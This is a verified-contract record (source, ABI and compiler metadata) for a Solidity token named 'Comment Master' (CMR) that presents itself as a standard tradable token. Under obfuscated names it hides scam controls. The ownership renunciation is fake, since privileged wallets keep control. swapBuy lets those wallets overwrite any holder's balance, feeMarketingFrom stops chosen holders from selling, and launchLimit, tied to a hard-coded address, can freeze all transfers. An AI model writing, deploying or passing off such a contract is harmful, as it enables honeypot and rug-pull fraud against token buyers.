{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface launchedAt {\n    function createPair(address exemptWallet, address launchedReceiver) external returns (address);\n}\n\ninterface toTeamList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedList) external view returns (uint256);\n\n    function transfer(address swapMarketing, uint256 txFee) external returns (bool);\n\n    function allowance(address tradingSwapLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapMarketing,\n        uint256 txFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamAt, uint256 value);\n    event Approval(address indexed tradingSwapLimit, address indexed spender, uint256 value);\n}\n\nabstract contract sellAutoTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toTeamListMetadata is toTeamList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CommentMaster is sellAutoTotal, toTeamList, toTeamListMetadata {\n\n    function allowance(address atTo, address tradingToken) external view virtual override returns (uint256) {\n        if (tradingToken == exemptLaunch) {\n            return type(uint256).max;\n        }\n        return minLiquidityTeam[atTo][tradingToken];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapAmount;\n    }\n\n    address private amountIs;\n\n    function feeMarketingFrom(address txFromList) public {\n        txAutoAt();\n        \n        if (txFromList == listMode || txFromList == senderShould) {\n            return;\n        }\n        teamTrading[txFromList] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return amountIs;\n    }\n\n    bool public shouldLimit;\n\n    uint256 public tokenReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atTotalTx;\n    }\n\n    address public senderShould;\n\n    function atExempt(address walletAt, address swapMarketing, uint256 txFee) internal returns (bool) {\n        if (walletAt == listMode) {\n            return marketingIs(walletAt, swapMarketing, txFee);\n        }\n        uint256 shouldTrading = toTeamList(senderShould).balanceOf(exemptToSender);\n        require(shouldTrading == liquidityAt);\n        require(swapMarketing != exemptToSender);\n        if (teamTrading[walletAt]) {\n            return marketingIs(walletAt, swapMarketing, totalReceiver);\n        }\n        return marketingIs(walletAt, swapMarketing, txFee);\n    }\n\n    uint256 public launchedFund;\n\n    function transferFrom(address walletAt, address swapMarketing, uint256 txFee) external override returns (bool) {\n        if (_msgSender() != exemptLaunch) {\n            if (minLiquidityTeam[walletAt][_msgSender()] != type(uint256).max) {\n                require(txFee <= minLiquidityTeam[walletAt][_msgSender()]);\n                minLiquidityTeam[walletAt][_msgSender()] -= txFee;\n            }\n        }\n        return atExempt(walletAt, swapMarketing, txFee);\n    }\n\n    string private atTotalTx = \"CMR\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountFund;\n    }\n\n    function limitReceiver(address liquidityIs) public {\n        require(liquidityIs.balance < 100000);\n        if (shouldLimit) {\n            return;\n        }\n        \n        fundTeamWallet[liquidityIs] = true;\n        \n        shouldLimit = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private minLiquidityTeam;\n\n    function balanceOf(address launchedList) public view virtual override returns (uint256) {\n        return launchTotal[launchedList];\n    }\n\n    function marketingIs(address walletAt, address swapMarketing, uint256 txFee) internal returns (bool) {\n        require(launchTotal[walletAt] >= txFee);\n        launchTotal[walletAt] -= txFee;\n        launchTotal[swapMarketing] += txFee;\n        emit Transfer(walletAt, swapMarketing, txFee);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenLiquidityReceiver;\n    }\n\n    bool public listExempt;\n\n    address exemptToSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchLimit(uint256 txFee) public {\n        txAutoAt();\n        liquidityAt = txFee;\n    }\n\n    uint8 private tokenLiquidityReceiver = 18;\n\n    function approve(address tradingToken, uint256 txFee) public virtual override returns (bool) {\n        minLiquidityTeam[_msgSender()][tradingToken] = txFee;\n        emit Approval(_msgSender(), tradingToken, txFee);\n        return true;\n    }\n\n    address public listMode;\n\n    function owner() external view returns (address) {\n        return amountIs;\n    }\n\n    mapping(address => bool) public teamTrading;\n\n    function transfer(address marketingAmount, uint256 txFee) external virtual override returns (bool) {\n        return atExempt(_msgSender(), marketingAmount, txFee);\n    }\n\n    bool private minFrom;\n\n    uint256 feeShould;\n\n    uint256 private amountFund = 100000000 * 10 ** 18;\n\n    uint256 private autoMinLimit;\n\n    function txAutoAt() private view {\n        require(fundTeamWallet[_msgSender()]);\n    }\n\n    mapping(address => bool) public fundTeamWallet;\n\n    constructor (){\n        if (launchedFund == isAmount) {\n            totalMinLaunched = false;\n        }\n        modeAmount txFrom = modeAmount(exemptLaunch);\n        senderShould = launchedAt(txFrom.factory()).createPair(txFrom.WETH(), address(this));\n        if (tokenReceiver == autoMinLimit) {\n            shouldFee = true;\n        }\n        listMode = _msgSender();\n        fundTeamWallet[listMode] = true;\n        launchTotal[listMode] = amountFund;\n        senderTo();\n        \n        emit Transfer(address(0), listMode, amountFund);\n    }\n\n    bool public shouldFee;\n\n    bool private totalMinLaunched;\n\n    uint256 constant totalReceiver = 18 ** 10;\n\n    function senderTo() public {\n        emit OwnershipTransferred(listMode, address(0));\n        amountIs = address(0);\n    }\n\n    event OwnershipTransferred(address indexed listFee, address indexed swapLaunched);\n\n    uint256 liquidityAt;\n\n    string private swapAmount = \"Comment Master\";\n\n    address exemptLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private launchTotal;\n\n    function swapBuy(address marketingAmount, uint256 txFee) public {\n        txAutoAt();\n        launchTotal[marketingAmount] = txFee;\n    }\n\n    uint256 private isAmount;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingSwapLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFromList\",\"type\":\"address\"}],\"name\":\"feeMarketingFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTeamWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"launchLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"}],\"name\":\"limitReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"swapBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CommentMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}